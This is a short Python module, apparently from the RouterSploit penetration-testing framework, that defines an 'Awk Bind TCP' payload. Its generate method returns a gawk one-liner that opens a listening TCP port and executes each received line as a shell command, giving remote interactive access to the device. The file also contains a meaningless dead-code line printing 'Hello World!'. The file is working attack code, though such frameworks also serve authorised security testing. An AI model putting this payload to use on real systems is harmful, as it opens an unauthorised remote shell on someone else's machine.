from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import BindTCPPayloadMixin, GenericPayload

class Payload(BindTCPPayloadMixin, GenericPayload):
    __info__ = {'name': 'Awk Bind TCP', 'description': 'Creates an interactive tcp bind shell by using (g)awk.', 'authors': ('Marcin Bury <marcin[at]threat9.com>',)}
    cmd = OptString('awk', 'Awk binary')

    def generate(self):
        if False:
            print('Hello World!')
        return self.cmd + ' \'BEGIN{s="/inet/tcp/' + str(self.rport) + '/0/0";for(;s|&getline c;close(c))' + "while(c|getline)print|&s;close(s)}'"